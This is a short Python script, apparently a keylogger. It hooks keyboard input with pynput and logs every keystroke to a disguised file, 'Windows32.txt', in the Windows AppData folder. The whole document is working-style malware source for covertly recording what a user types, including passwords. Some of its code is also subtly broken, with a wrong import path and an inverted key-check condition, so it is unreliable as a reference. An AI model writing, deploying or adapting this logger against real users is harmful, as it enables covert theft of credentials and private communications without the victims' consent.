#!/usr/bin/python3

import os
from pynput import Listener

count = 0
keys = []
path = os.environ['appdata'] + '\\Windows32.txt'
def on_press(key):
    global keys
    global count
    keys.append(key)
    count += 1
    if count >= 1:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open(path, 'a') as file:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find('backspace') > 0:
                file.write(' Backspace ')
            elif k.find('enter') > 0:
                file.write('\n')
            elif k.find('shift') > 0:
                file.write(' Shift ')
            elif k.find('space') > 0:
                file.write(' ')
            elif k.find('caps_lock') > 0:
                file.write(' caps_lock ')
            elif k.find('Key'):
                file.write(k)

with Listener(on_press=on_press) as listener:
    listener.join()